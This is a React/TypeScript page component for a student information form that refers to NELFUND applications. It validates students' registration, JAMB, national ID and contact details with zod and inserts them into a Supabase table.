import { useState } from "react";
import { Helmet } from "react-helmet-async";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { Send, GraduationCap, CheckCircle } from "lucide-react";
import { z } from "zod";

const universitySchema = z.object({
  matric_number: z.string().trim().min(1, "Registration/Matric Number is required").max(50),
  first_name: z.string().trim().min(1, "First Name is required").max(50),
  last_name: z.string().trim().min(1, "Last Name is required").max(50),
  other_name: z.string().trim().max(50).optional(),
  date_of_birth: z.string().min(1, "Date of Birth is required"),
  gender: z.enum(["M", "F"], { required_error: "Gender is required" }),
  state_of_origin: z.string().trim().min(1, "State of Origin is required").max(50),
  lga: z.string().trim().min(1, "LGA is required").max(50),
  level: z.string().trim().min(1, "Level is required").max(10),
  jamb_number: z.string().trim().min(1, "Jamb Number is required").max(50),
  nin: z.string().trim().min(1, "NIN is required").max(20),
  phone_number: z.string().trim().min(1, "Phone Number is required").max(20),
  email_address: z.string().email("Invalid email address"),
  program: z.string().trim().min(1, "Program is required").max(100),
  department: z.string().trim().min(1, "Department is required").max(100),
  faculty: z.string().trim().min(1, "Faculty is required").max(100),
  duration_of_course: z.string().trim().min(1, "Duration of Course is required").max(50),
  total_fees: z.string().trim().min(1, "Total Fees is required").max(50),
  academic_session: z.string().trim().min(1, "Academic Session is required").max(20),
});

const Universities = () => {
  const [form, setForm] = useState({
    matric_number: "",
    first_name: "",
    last_name: "",
    other_name: "",
    date_of_birth: "",
    gender: "",
    state_of_origin: "",
    lga: "",
    level: "",
    jamb_number: "",
    nin: "",
    phone_number: "",
    email_address: "",
    program: "",
    department: "",
    faculty: "",
    duration_of_course: "",
    total_fees: "",
    academic_session: "",
  });
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleChange = (field: string, value: string) => {
    setForm((prev) => ({ ...prev, [field]: value }));
    setErrors((prev) => ({ ...prev, [field]: "" }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const result = universitySchema.safeParse(form);
    if (!result.success) {
      const fieldErrors: Record<string, string> = {};
      result.error.errors.forEach((err) => {
        fieldErrors[err.path[0] as string] = err.message;
      });
      setErrors(fieldErrors);
      return;
    }

    setSubmitting(true);

    const { error } = await supabase.from("universities").insert([{
      matric_number: result.data.matric_number,
      first_name: result.data.first_name,
      last_name: result.data.last_name,
      other_name: result.data.other_name || null,
      date_of_birth: result.data.date_of_birth,
      gender: result.data.gender,
      state_of_origin: result.data.state_of_origin,
      lga: result.data.lga,
      level: result.data.level,
      jamb_number: result.data.jamb_number,
      nin: result.data.nin,
      phone_number: result.data.phone_number,
      email_address: result.data.email_address,
      program: result.data.program,
      department: result.data.department,
      faculty: result.data.faculty,
      duration_of_course: result.data.duration_of_course,
      total_fees: result.data.total_fees,
      academic_session: result.data.academic_session,
    }]);

    if (error) {
      if (error.code === "23505") {
        const uniqueFields = ["matric_number", "jamb_number", "nin"];
        const errorField = uniqueFields.find(field => error.message.includes(field));
        if (errorField) {
          toast.error(`This ${errorField.replace("_", "/").toUpperCase()} is already registered.`);
          setErrors({ [errorField]: "Already registered" });
        } else {
          toast.error("A unique field is already registered.");
        }
      } else {
        toast.error("Failed to submit. Please try again.");
      }
    } else {
      setSubmitted(true);
      toast.success("Information submitted successfully!");
    }
    setSubmitting(false);
  };

  if (submitted) {
    return (
      <div className="page-container flex items-center justify-center px-4">
        <div className="form-card max-w-md w-full text-center">
          <CheckCircle className="h-16 w-16 text-primary mx-auto mb-4" />
          <h2 className="text-2xl font-bold text-foreground mb-2">Submitted!</h2>
          <p className="text-muted-foreground mb-6">
            Your university information has been recorded successfully.
          </p>
        </div>
      </div>
    );
  }

  return (
    <>
      <Helmet>
        <meta property="og:description" content="STUDENTS THAT HAVE ISSUES APPLYING FOR NELFUND" />
        <title>University Student Information</title>
      </Helmet>
      <div className="page-container flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-2xl">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-accent mb-4">
            <GraduationCap className="h-8 w-8 text-accent-foreground" />
          </div>
          <h1 className="text-2xl font-bold text-foreground mb-2">University Student Information</h1>
          <p className="text-muted-foreground">Please fill in your university details below</p>
        </div>

        <div className="form-card">
          <form onSubmit={handleSubmit} className="space-y-5">
            {([
              { key: "matric_number", label: "Registration/Matric Number", placeholder: "250301-056", type: "text" },
              { key: "first_name", label: "First Name", placeholder: "FAITH", type: "text" },
              { key: "last_name", label: "Last Name", placeholder: "CHUKWUEMEKA", type: "text" },
              { key: "other_name", label: "Other Name", placeholder: "CHINENYE", type: "text" },
              { key: "date_of_birth", label: "Date of Birth", placeholder: "1998-10-08", type: "date" },
              { key: "gender", label: "Gender", placeholder: "Select Gender", type: "select" },
              { key: "state_of_origin", label: "State of Origin", placeholder: "ANAMBRA", type: "text" },
              { key: "lga", label: "LGA", placeholder: "ONITSHA", type: "text" },
              { key: "level", label: "Level", placeholder: "100", type: "text" },
              { key: "jamb_number", label: "Jamb Number", placeholder: "20224683KF", type: "text" },
              { key: "nin", label: "NIN", placeholder: "8369 567 8796", type: "text" },
              { key: "phone_number", label: "Phone Number", placeholder: "08034465473", type: "tel" },
              { key: "email_address", label: "Email Address", placeholder: "faithy@gmail.com", type: "email" },
              { key: "program", label: "Program", placeholder: "B.Sc. Accounting", type: "text" },
              { key: "department", label: "Department", placeholder: "Accounting", type: "text" },
              { key: "faculty", label: "Faculty", placeholder: "Management Sciences", type: "text" },
              { key: "duration_of_course", label: "Duration of Course", placeholder: "4 Years", type: "text" },
              { key: "total_fees", label: "Total Fees", placeholder: "175,000", type: "text" },
              { key: "academic_session", label: "Academic Session", placeholder: "2024/2025", type: "text" },
            ] as const).map(({ key, label, placeholder, type }) => (
              <div key={key} className="space-y-2">
                <Label htmlFor={key}>{label}</Label>
                {type === "select" ? (
                  <Select value={form[key as keyof typeof form]} onValueChange={(value) => handleChange(key, value)}>
                    <SelectTrigger className={errors[key] ? "border-destructive" : ""}>
                      <SelectValue placeholder={placeholder} />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="M">Male</SelectItem>
                      <SelectItem value="F">Female</SelectItem>
                    </SelectContent>
                  </Select>
                ) : (
                  <Input
                    id={key}
                    type={type}
                    value={form[key as keyof typeof form]}
                    onChange={(e) => handleChange(key, e.target.value)}
                    placeholder={placeholder}
                    className={errors[key] ? "border-destructive" : ""}
                  />
                )}
                {errors[key] && (
                  <p className="text-sm text-destructive">{errors[key]}</p>
                )}
              </div>
            ))}

            <Button type="submit" className="w-full" size="lg" disabled={submitting}>
              <Send className="mr-2 h-4 w-4" />
              {submitting ? "Submitting..." : "Submit Information"}
            </Button>
          </form>
        </div>
      </div>
    </div>
    </>
  );
};

export default Universities;